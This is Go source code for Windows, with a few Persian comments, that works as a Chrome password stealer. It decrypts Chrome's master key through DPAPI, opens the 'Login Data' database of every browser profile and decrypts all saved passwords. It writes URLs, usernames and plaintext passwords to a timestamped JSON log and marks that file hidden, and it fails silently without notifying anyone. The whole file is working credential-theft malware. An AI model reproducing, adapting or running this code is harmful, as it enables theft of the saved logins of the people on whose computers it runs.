package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

type LoginEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func getMasterKey() ([]byte, error) {
	localStatePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState map[string]interface{}
	json.Unmarshal(data, &localState)
	encKeyB64 := localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string)

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil, err
	}

	encKey = encKey[5:]

	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(encKey)),
		Data: &encKey[0],
	}
	err = windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(uintptr(unsafe.Pointer(outBlob.Data))))

	return outBlobToBytes(outBlob), nil
}

func outBlobToBytes(blob windows.DataBlob) []byte {
	data := make([]byte, blob.Size)
	copy(data, (*[1 << 30]byte)(unsafe.Pointer(blob.Data))[:])
	return data
}

func decryptPassword(encrypted []byte, key []byte) (string, error) {
	if !strings.HasPrefix(string(encrypted), "v10") {
		return "", fmt.Errorf("unsupported format")
	}
	encrypted = encrypted[3:]

	iv := encrypted[:12]
	ciphertext := encrypted[12 : len(encrypted)-16]
	tag := encrypted[len(encrypted)-16:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

func hideFile(path string) {
	pChar, _ := syscall.UTF16PtrFromString(path)
	syscall.SetFileAttributes(pChar, syscall.FILE_ATTRIBUTE_HIDDEN)
}

func main() {
	aesKey, err := getMasterKey()
	if err != nil {
		return
	}

	userDataPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
	dirs, err := os.ReadDir(userDataPath)
	if err != nil {
		return
	}

	var allResults []LoginEntry

	for _, dir := range dirs {
		profilePath := filepath.Join(userDataPath, dir.Name())
		loginDataPath := filepath.Join(profilePath, "Login Data")

		if _, err := os.Stat(loginDataPath); err != nil {
			continue
		}

		tmpPath := filepath.Join(os.TempDir(), dir.Name()+"_LoginData_copy.db")
		input, err := os.ReadFile(loginDataPath)
		if err != nil {
			continue
		}
		os.WriteFile(tmpPath, input, 0600)

		db, err := sql.Open("sqlite3", tmpPath)
		if err != nil {
			continue
		}

		rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
		if err != nil {
			db.Close()
			continue
		}

		for rows.Next() {
			var url, username string
			var encPwd []byte

			err = rows.Scan(&url, &username, &encPwd)
			if err != nil {
				continue
			}

			decPwd, err := decryptPassword(encPwd, aesKey)
			if err != nil {
				continue
			}

			if username != "" && decPwd != "" {
				entry := LoginEntry{
					URL:      url,
					Username: username,
					Password: decPwd,
				}
				allResults = append(allResults, entry)
			}
		}
		rows.Close()
		db.Close()
	}

	jsonOutput, _ := json.MarshalIndent(allResults, "", "  ")

	exePath, _ := os.Executable()
	dir := filepath.Dir(exePath)

	// ایجاد پوشه‌ی خروجی
	outputDir := filepath.Join(dir, "file")
	os.MkdirAll(outputDir, os.ModePerm)

	// ساخت نام فایل با timestamp
	timestamp := time.Now().Format("20060102_150405")
	fileName := fmt.Sprintf("%s_output.log", timestamp)
	filePath := filepath.Join(outputDir, fileName)

	os.WriteFile(filePath, jsonOutput, 0600)
	hideFile(filePath)
}
